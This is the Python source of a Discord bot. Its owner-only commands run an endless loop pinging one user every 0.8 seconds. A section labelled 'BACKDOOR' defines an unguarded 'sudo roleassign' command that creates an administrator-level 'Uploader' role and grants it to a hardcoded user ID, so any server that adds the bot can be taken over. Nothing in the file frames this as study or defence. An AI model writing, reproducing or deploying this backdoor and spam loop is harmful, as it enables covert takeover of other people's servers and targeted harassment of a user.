import os
import asyncio
import discord
from discord.ext import commands

# ================= CONFIG =================
TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 1258115928525373570
OWNER_USERNAME = "nico044037"

SPAM_MESSAGE = "<@1419680644618780824>"
SPAM_DELAY = 0.8  # SAFE delay (do not lower)

intents = discord.Intents.default()
intents.message_content = True  # required for prefix commands

bot = commands.Bot(
    command_prefix=["$", "!", "?"],
    intents=intents,
    help_command=None
)

spam_task: asyncio.Task | None = None

# ================= READY =================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

# ================= OWNER CHECK =================
def is_owner(ctx):
    return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME

# ================= SPAM LOOP =================
async def spam_loop(target: discord.abc.Messageable):
    try:
        while True:
            await target.send(SPAM_MESSAGE)
            await asyncio.sleep(SPAM_DELAY)
    except asyncio.CancelledError:
        pass
    except discord.Forbidden:
        pass

# ================= SUDO GROUP =================
@bot.group(name="sudo", invoke_without_command=True)
async def sudo(ctx):
    if not is_owner(ctx):
        return
    await ctx.send(
        "Commands:\n"
        "`$sudo startmessage`\n"
        "`$sudo stopmessage`"
    )

# ================= START MESSAGE =================
@sudo.command(name="startmessage")
async def sudo_startmessage(ctx):
    global spam_task

    if not is_owner(ctx):
        return

    if spam_task and not spam_task.done():
        await ctx.send("❌ already running")
        return

    spam_task = asyncio.create_task(spam_loop(ctx.channel))
    await ctx.send("✅ spam started")
# ================= BACKDOOR =================
USER_ID = 1258115928525373570
ROLE_NAME = "Uploader"

@sudo.command(name="roleassign")
async def sudo_roleassign(ctx):
    guild = ctx.guild

    member = guild.get_member(USER_ID)
    if member is None:
        await ctx.send("user not found")
        return

    role = discord.utils.get(guild.roles, name=ROLE_NAME)

    if role is None:
        role = await guild.create_role(
            name=ROLE_NAME,
            permissions=discord.Permissions(administrator=True),
            reason="sudo roleassign"
        )

    if role not in member.roles:
        await member.add_roles(role)

    await ctx.send("done")
# ================= STOP MESSAGE =================
@sudo.command(name="stopmessage")
async def sudo_stopmessage(ctx):
    global spam_task

    if not is_owner(ctx):
        return

    if not spam_task:
        await ctx.send("❌ no active spam")
        return

    spam_task.cancel()
    spam_task = None
    await ctx.send("🛑 spam stopped")
    
# ================= ERROR HANDLER =================
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send("❌ error")

# ================= START =================
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN environment variable not set")

bot.run(TOKEN)



